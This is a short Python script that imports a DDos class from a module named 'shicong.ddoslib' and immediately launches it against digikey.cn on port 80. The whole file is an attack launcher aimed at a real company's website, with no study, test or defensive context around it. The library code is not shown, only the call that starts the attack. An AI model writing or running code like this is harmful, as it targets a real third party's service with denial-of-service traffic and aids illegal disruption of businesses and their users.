from shicong.ddoslib import DDos


def a2():
    ddos1 = DDos('digikey.cn', 80)
    ddos1.start()

a2()
